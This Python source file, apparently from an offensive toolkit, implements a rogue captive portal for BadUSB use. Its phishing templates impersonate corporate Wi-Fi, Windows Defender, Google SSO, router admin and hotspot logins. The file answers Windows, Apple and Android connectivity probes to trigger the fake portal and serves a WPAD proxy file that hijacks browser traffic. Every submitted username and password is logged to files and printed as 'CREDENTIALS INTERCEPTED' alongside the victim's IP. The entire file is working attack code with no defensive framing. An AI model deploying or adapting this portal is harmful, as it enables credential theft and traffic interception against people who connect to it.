#!/usr/bin/env python3
"""
hard-tools: lib/rogue_portal.py
Advanced BadUSB Rogue Captive Portal, WPAD Responder & Credential Logger
Supports multiple theme templates (Corporate, Windows Update, Router, Hotspot, Google SSO)
and native OS probe responders (Windows NCSI, Apple Captive, Android 204, Firefox).
"""

import http.server
import socketserver
import urllib.parse
import sys
import os
import datetime
import json
import argparse

PORT = 80
LOG_FILE = "/tmp/badusb_credentials.log"
JSON_LOG_FILE = "/tmp/badusb_credentials.json"
CURRENT_TEMPLATE = "corporate_wifi"

TEMPLATES = {
    "corporate_wifi": {
        "title": "Corporate Wi-Fi & Network Authentication",
        "badge": "ENTERPRISE NETWORK GATEWAY",
        "heading": "Network Authentication Required",
        "subheading": "Your device requires enterprise domain authentication to access intranet and internet resources.",
        "user_label": "Domain Username or Corporate Email",
        "btn_text": "Authenticate & Connect"
    },
    "windows_update": {
        "title": "Windows Security & Network Policy Sync",
        "badge": "MICROSOFT WINDOWS DEFENDER",
        "heading": "Windows Network Verification",
        "subheading": "A critical network policy update is required. Please verify your Windows credentials to resume connectivity.",
        "user_label": "Windows Account (e.g. DOMAIN\\user or Email)",
        "btn_text": "Verify Credentials"
    },
    "router_admin": {
        "title": "Router / Gateway Administration",
        "badge": "GATEWAY MANAGEMENT CONSOLE",
        "heading": "Gateway Session Expired",
        "subheading": "The administrative session for this gateway has expired. Re-authenticate to resume management and routing.",
        "user_label": "Administrator Username",
        "btn_text": "Login to Gateway"
    },
    "google_sso": {
        "title": "Google Workspace Single Sign-On",
        "badge": "GOOGLE SSO SECURE GATEWAY",
        "heading": "Sign in with Google",
        "subheading": "Network access managed by Google Identity Services. Enter your workspace credentials.",
        "user_label": "Email or Phone",
        "btn_text": "Next"
    },
    "generic_hotspot": {
        "title": "High-Speed Wi-Fi Hotspot Login",
        "badge": "HOTSPOT ACCESS PORTAL",
        "heading": "Free High-Speed Access",
        "subheading": "Log in with your email and access code to activate unlimited high-speed internet access.",
        "user_label": "Email Address",
        "btn_text": "Activate Internet"
    }
}

HTML_SHELL = """<!DOCTYPE html>
<html>
<head>
    <title>{title}</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta charset="utf-8">
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; }}
        body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif; background: #0b1120; color: #f8fafc; display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 1rem; }}
        .card {{ background: #1e293b; padding: 2.5rem; border-radius: 16px; box-shadow: 0 20px 40px rgba(0,0,0,0.6); width: 100%; max-width: 440px; text-align: center; border: 1px solid #334155; }}
        .badge {{ display: inline-block; background: #0284c7; color: #f0f9ff; padding: 5px 12px; border-radius: 9999px; font-size: 0.75rem; font-weight: 700; letter-spacing: 0.05em; margin-bottom: 1.25rem; }}
        h2 {{ margin-bottom: 0.75rem; color: #38bdf8; font-size: 1.5rem; font-weight: 600; }}
        p {{ color: #94a3b8; font-size: 0.95rem; margin-bottom: 1.75rem; line-height: 1.5; }}
        .field {{ text-align: left; margin-bottom: 1.25rem; }}
        label {{ display: block; font-size: 0.85rem; color: #cbd5e1; margin-bottom: 0.4rem; font-weight: 500; }}
        input {{ width: 100%; padding: 0.85rem 1rem; border: 1px solid #475569; border-radius: 8px; background: #0f172a; color: #fff; font-size: 1rem; transition: border-color 0.2s; }}
        input:focus {{ outline: none; border-color: #38bdf8; }}
        button {{ width: 100%; padding: 0.9rem; background: #0284c7; color: white; border: none; border-radius: 8px; font-weight: 700; cursor: pointer; font-size: 1rem; transition: background 0.2s; margin-top: 0.5rem; }}
        button:hover {{ background: #0369a1; }}
        .footer {{ margin-top: 1.5rem; font-size: 0.75rem; color: #64748b; }}
    </style>
</head>
<body>
    <div class="card">
        <div class="badge">{badge}</div>
        <h2>{heading}</h2>
        <p>{subheading}</p>
        <form method="POST" action="/login">
            <div class="field">
                <label>{user_label}</label>
                <input type="text" name="username" placeholder="user@company.com" required autocomplete="off" autofocus>
            </div>
            <div class="field">
                <label>Password</label>
                <input type="password" name="password" placeholder="••••••••••••" required>
            </div>
            <button type="submit">{btn_text}</button>
        </form>
        <div class="footer">Protected by Hard-Tools Rogue Gateway • Secure Tunnel Active</div>
    </div>
</body>
</html>
"""

SUCCESS_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>Authenticated</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #0b1120; color: #22c55e; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
        .box { background: #1e293b; padding: 3rem; border-radius: 16px; border: 1px solid #334155; }
        h1 { margin-bottom: 0.5rem; }
        p { color: #94a3b8; }
    </style>
</head>
<body>
    <div class="box">
        <h1>✔ Connection Authenticated</h1>
        <p>Full internet access granted. Resuming network traffic...</p>
    </div>
</body>
</html>
"""

WPAD_PAC = """function FindProxyForURL(url, host) {
    return "PROXY 192.168.42.1:80; DIRECT";
}
"""

class RoguePortalHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Silence default stderr logging
        pass

    def do_GET(self):
        client_ip = self.client_address[0]
        path = self.path
        now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # 1. WPAD Proxy Discovery Responder
        if path.startswith("/wpad.dat") or path.startswith("/wpad.da"):
            print(f"\033[1;36m[*] [WPAD]\033[0m Sent PAC proxy file to {client_ip}")
            self.send_response(200)
            self.send_header('Content-Type', 'application/x-ns-proxy-autoconfig')
            self.end_headers()
            self.wfile.write(WPAD_PAC.encode('utf-8'))
            return

        # 2. Windows NCSI Probes
        if path == "/ncsi.txt":
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Microsoft NCSI")
            return

        if path == "/connecttest.txt":
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Microsoft Connect Test")
            return

        # 3. Android / Chrome Captive Probes
        if path.startswith("/generate_204") or path.startswith("/gen_204"):
            # Return redirect to root so captive portal popup appears
            self.send_response(302)
            self.send_header('Location', 'http://192.168.42.1/')
            self.end_headers()
            return

        # 4. Apple Captive Probes
        if path.startswith("/hotspot-detect.html") or path.startswith("/library/test/success.html"):
            pass # Fall through to render portal

        # 5. Default: Render Active Template
        tmpl_data = TEMPLATES.get(CURRENT_TEMPLATE, TEMPLATES["corporate_wifi"])
        html_rendered = HTML_SHELL.format(**tmpl_data)

        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(html_rendered.encode('utf-8'))

        ua = self.headers.get('User-Agent', 'Unknown')
        entry = f"[{now_str}] PROBE: {client_ip} -> {path} (UA: {ua})\n"
        with open(LOG_FILE, 'a') as f:
            f.write(entry)
        print(f"\033[1;34m[*] Probe\033[0m {client_ip} -> {path}")

    def do_POST(self):
        client_ip = self.client_address[0]
        now_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        content_len = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_len).decode('utf-8', errors='ignore')
        parsed = urllib.parse.parse_qs(post_body)

        user = parsed.get('username', [''])[0]
        passwd = parsed.get('password', [''])[0]

        # Log to flat log
        entry = f"[{now_str}] CREDENTIALS: User='{user}' Pass='{passwd}' IP={client_ip} Template='{CURRENT_TEMPLATE}'\n"
        with open(LOG_FILE, 'a') as f:
            f.write(entry)

        # Log to JSON log
        cred_obj = {
            "timestamp": now_str,
            "ip": client_ip,
            "username": user,
            "password": passwd,
            "template": CURRENT_TEMPLATE,
            "user_agent": self.headers.get('User-Agent', 'Unknown')
        }
        try:
            records = []
            if os.path.exists(JSON_LOG_FILE):
                with open(JSON_LOG_FILE, 'r') as jf:
                    records = json.load(jf)
            records.append(cred_obj)
            with open(JSON_LOG_FILE, 'w') as jf:
                json.dump(records, jf, indent=2)
        except Exception:
            pass

        print(f"\n\033[1;32m====================================================\033[0m")
        print(f"\033[1;32m[+] CREDENTIALS INTERCEPTED!\033[0m")
        print(f"    Victim IP:   {client_ip}")
        print(f"    Username:    \033[1;37m{user}\033[0m")
        print(f"    Password:    \033[1;33m{passwd}\033[0m")
        print(f"    Template:    {CURRENT_TEMPLATE}")
        print(f"    Timestamp:   {now_str}")
        print(f"\033[1;32m====================================================\033[0m\n")

        self.send_response(200)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.end_headers()
        self.wfile.write(SUCCESS_TEMPLATE.encode('utf-8'))


def main():
    global PORT, CURRENT_TEMPLATE
    parser = argparse.ArgumentParser(description="hard-tools Advanced Rogue Captive Portal")
    parser.add_argument("port", nargs="?", type=int, default=80, help="Listening port (default: 80)")
    parser.add_argument("--template", choices=list(TEMPLATES.keys()), default="corporate_wifi", help="Captive portal template")
    parser.add_argument("--list-templates", action="store_true", help="List all available templates")
    args = parser.parse_args()

    if args.list_templates:
        print("Available Portal Templates:")
        for k, v in TEMPLATES.items():
            print(f"  * {k:16s} : {v['title']}")
        return

    PORT = args.port
    CURRENT_TEMPLATE = args.template

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), RoguePortalHandler) as httpd:
        print(f"\033[1;32m[+] Rogue Captive Portal listening on port {PORT}...\033[0m")
        print(f"    Active Template: \033[1;36m{CURRENT_TEMPLATE}\033[0m ({TEMPLATES[CURRENT_TEMPLATE]['title']})")
        print(f"    Credential Log:  {LOG_FILE}")
        httpd.serve_forever()

if __name__ == "__main__":
    main()
